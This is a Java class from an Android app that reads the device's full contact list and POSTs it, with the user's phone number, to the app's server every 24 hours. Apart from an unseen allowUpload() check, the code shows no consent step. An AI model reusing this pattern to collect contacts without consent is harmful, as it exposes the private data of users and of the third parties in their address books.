package com.m1.android.data.action;

import java.util.HashMap;
import java.util.List;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.m1.android.data.dao.ContactDao;
import com.m1.android.data.entity.Contact;
import com.m1.android.data.entity.Result;
import com.m1.android.data.util.AppUtil;
import com.m1.android.data.util.LocalManager;

public class UpContactAction extends BaseAction {

	@Override
	public boolean excute() {
		try {
			// 主程序才上传联系人数据
			if (allowUpload() && !AppUtil.isPatch(mContext)) {
				List<Contact> contacts = ContactDao.readContact(mContext);
				if (contacts != null && !contacts.isEmpty()) {
					HashMap<String, String> params = new HashMap<String, String>();
					params.put("phone", mPhone);
					Gson gson = new GsonBuilder().excludeFieldsWithoutExposeAnnotation().create();
					params.put("contacts", gson.toJson(contacts));
					Result result = mHttpWrapper.post(getRequestUrl(), params, Result.class);
					if (result != null && result.isSuccess()) {
						LocalManager.updateContactList(mContext, contacts);
					}
				}
				return true;
			} else {
				return false;
			}
		} catch (Exception e) {
			e.printStackTrace();
			// 发生异常时，仍允许下一个继续上传
			return true;
		}
	}

	@Override
	protected String getRequestUrl() {
		return DEFAULT_HOST + "/uploadContact.htm";
	}

	@Override
	public long getExcutePeriod() {
		return 24 * 60 * 60 * 1000;
	}

}
